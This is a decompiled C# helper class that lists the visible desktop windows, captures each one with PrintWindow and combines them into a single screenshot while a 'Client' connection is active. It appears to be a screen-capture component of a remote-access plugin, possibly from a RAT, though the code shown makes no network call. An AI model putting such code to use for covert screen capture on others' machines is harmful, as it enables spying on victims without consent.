using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.InteropServices;

namespace Plugin.Helper;

internal class HelperScreen
{
	public delegate bool EnumDelegate(IntPtr hWnd, int lParam);

	public struct RECT
	{
		public int Left;

		public int Top;

		public int Right;

		public int Bottom;
	}

	public static List<IntPtr> Num_List;

	[DllImport("user32")]
	public static extern bool GetWindowRect(IntPtr hWnd, ref RECT lpRect);

	[DllImport("user32.dll")]
	public static extern bool IsWindowVisible(IntPtr hWnd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumDelegate lpEnumCallbackFunction, IntPtr lParam);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr PrintWindow(IntPtr hwnd, IntPtr hDC, uint nFlags);

	[DllImport("user32.dll")]
	public static extern IntPtr GetWindowDC(IntPtr hWnd);

	[DllImport("user32.dll")]
	public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);

	[DllImport("gdi32.dll")]
	public static extern bool DeleteDC(IntPtr hDC);

	[DllImport("user32.dll")]
	public static extern IntPtr GetTopWindow(IntPtr hWnd);

	public static bool List_screen(IntPtr hWnd, int lParam)
	{
		try
		{
			if (IsWindowVisible(hWnd))
			{
				if (hWnd == IntPtr.Zero)
				{
					return false;
				}
				Num_List.Add(hWnd);
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static Bitmap GetScreen(int x, int y)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		Num_List = new List<IntPtr>();
		Bitmap val = new Bitmap(x, y);
		if (EnumDesktopWindows(IntPtr.Zero, List_screen, IntPtr.Zero))
		{
			for (int i = Num_List.Count - 1; i > -1; i += -1)
			{
				if (!Client.itsConnect)
				{
					break;
				}
				RECT lpRect = default(RECT);
				_ = Num_List[i];
				Bitmap val2 = new ScreenCapture().CaptureWindow(Num_List[i]);
				GetWindowRect(Num_List[i], ref lpRect);
				Graphics val3 = Graphics.FromImage((Image)(object)val);
				try
				{
					val3.DrawImage((Image)(object)val2, lpRect.Left, lpRect.Top);
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
			}
		}
		return val;
	}
}
